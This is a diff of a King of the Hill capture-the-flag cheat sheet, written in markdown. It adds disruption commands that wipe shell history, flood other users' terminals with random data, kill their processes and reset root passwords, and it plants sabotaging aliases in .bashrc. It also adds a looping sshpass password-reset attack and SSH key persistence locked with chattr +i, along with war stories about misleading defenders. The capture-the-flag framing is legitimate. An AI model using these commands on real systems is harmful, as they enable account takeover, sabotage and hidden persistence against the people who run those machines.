@@ -376,6 +376,12 @@ rustscan -a $IP
 
 ```
 
+## CADAVER
+
+```
+cadaver http://$IP/uploads
+```
+
 ## Feroxbuster
 ```
 feroxbuster --url $URL -no-recursion
@@ -383,6 +389,7 @@ feroxbuster -u $URL -t 100 -no-recursion -x html,php,txt
 feroxbuster -u $URL -w /usr/share/wordlists/dirb/big.txt -t 100
 ```
 
+##  KoTH counter-attack / disruption cheats
 ```
 history -c && rm ~/.bash_history
 grep -oE '"(username|password)"\s*:\s*"[^"]*"'i
@@ -390,16 +397,37 @@ grep -oE '"(username|password)"\s*:\s*"[^"]*"'i
 w | grep -v "myip" | awk '{print $2}' | while read line; do cat /dev/urandom > /dev/$line; done
 
 ps aux | grep -E "(name|name2|name3)" | awk '{print $2}' | xargs kill -9
+
 echo 'cyber:just 4 me' | chpasswd
 ```
-```
+
 ## More Trolling 
+
+Drop in .bashrc or /etc/bashrc file
+```
 alias cat='/bin/true'
 alias grep='/bin/false'
 alias systemctl='/bin/true'
 alias sudo='/bin/false'
 
+```
+
+## Counter of the above
+```
+# Bypass aliases entirely with full paths or env -i
+/usr/bin/cat /etc/passwd
+/usr/bin/grep cyber /etc/passwd
+/usr/bin/sudo -i
+
+# Or check for the aliases and remove them
+alias | grep -E 'cat|grep|systemctl|sudo'
+unalias cat grep systemctl sudo 2>/dev/null
+# Then check the .bashrc
+grep alias ~/.bashrc   
+```
+
 ## KOTH War Stores (everything looks fine)
+```
 A defender said:
 “All services are up, nothing wrong.”
 But nobody could connect to SSH.
@@ -418,10 +446,11 @@ Reality:
 - Firewall dropped traffic
 - Defender trusted the tools, not reality
 👑 Crown held for 30+ minutes
+```
 
 # 🧨 WAR STORY #2 — The Vanishing Files Incident
+```
 Symptom
-
 Every time someone ran:
 
 cat /root/.ssh/authorized_keys
@@ -436,8 +465,10 @@ Scripts think keys exist
 Humans think file is empty
 The file still existed.
 Nobody thought to run /bin/cat.
+```
 
 # 🧠 WAR STORY #3 — The “Sudo Is Broken” Psy-Op
+```
 Symptom
 Multiple players complained:
 “sudo is broken on this box”
@@ -454,8 +485,10 @@ Already had root shell
 Watched panic unfold
 Reclaimed crown repeatedly
 Psychological warfare > exploits.
+```
 
 # 🧪 WAR STORY #4 — PATH Hijack Hell
+```
 Setup
 Defenders relied on:
 ps aux
@@ -472,8 +505,10 @@ But:
 /bin/ps aux
 Shows attacker’s persistence.
 Most players never checked /bin/ps.
+```
 
 # 🔥 WAR STORY #5 — Cron vs Alias Mismatch
+```
 Defender mistake
 They added cleanup scripts:
 @reboot /home/defender/cleanup.sh
@@ -489,8 +524,10 @@ Defender wasted time auditing crontabs
 
 Lesson:
 👉 Know where your changes apply.
+```
 
 # 🧬 WAR STORY #6 — The Gets() Binary Trap
+```
 Someone uploaded a crackme binary (like yours 😉) using gets().
 Attacker:
 Didn’t crack password
@@ -502,9 +539,10 @@ Counting characters
 Missing exploit entirely
 KOTH truth:
 CTF mindset > puzzle mindset
+```
 
 🧠 WAR STORY #7 — SSH Key Whack-a-Mole
-
+```
 Classic KOTH loop
 Defender deletes attacker SSH key
 Attacker re-adds it
@@ -517,9 +555,9 @@ File can’t be modified
 Root needed to remove
 Defender locked out unless they notice
 👑 Crown secured.
-
+```
 🧨 WAR STORY #8 — Fake Defender Backdoor
-
+```
 Attacker planted:
 echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
 Then also:
@@ -532,9 +570,10 @@ Keep restarting services
 Reality:
 Firewall was killing SSH
 Attacker had reverse shell anyway
+```
 
 🧠 WAR STORY #9 — The “Helpful” Message Trap
-
+```
 Attacker edited /etc/motd:
 System compromised.
 Attacker persistence via cron.
@@ -544,9 +583,10 @@ Spent 20 minutes auditing cron
 Missed /etc/profile backdoor
 Crown stolen repeatedly
 Never trust banners.
+```
 
 🧪 WAR STORY #10 — Evil /bin/false in Login Shells
-
+```
 Attacker changed /etc/passwd:
 user:x:1001:1001::/home/user:/bin/false
 
@@ -556,8 +596,9 @@ SSH closes immediately
 Looks like password issue
 CTF lesson:
 Login shell matters.
-
+```
 🧠 META KOTH STRATEGY (THIS WINS GAMES)
+```
 🔑 Attack layers
 Persistence (SSH keys, services, cron)
 Visibility denial (aliases, PATH hijack)
@@ -578,10 +619,26 @@ KOTH becomes a mind game, not hacking.
 👑 Final KOTH Wisdom
 “The crown is not held by root.
 It is held by confusion.”
-
-
 ```
 
+## Password Reset Loop
+```
 while [ 1 ]; do timeout 5 sshpass -p toor ssh root@ip "echo 'root:pass1234@' | chpasswd"; done
+```
 
+## SSH Key Persistence for KoTH
 
+```
+##On your attack box (one-time):
+ssh-keygen -t ed25519 -f ~/.ssh/koth -N ""   
+
+## On the target (once you have root):
+# 1. Install your public key
+mkdir -p /root/.ssh
+echo "ssh-ed25519 AAAA...your-key... @attackbox" >> /root/.ssh/authorized_keys
+chmod 700 /root/.ssh
+chmod 600 /root/.ssh/authorized_keys
+
+# 2. Lock it down
+chattr +i /root/.ssh/authorized_keys   # makes it read-only, even root can't edit   
+```
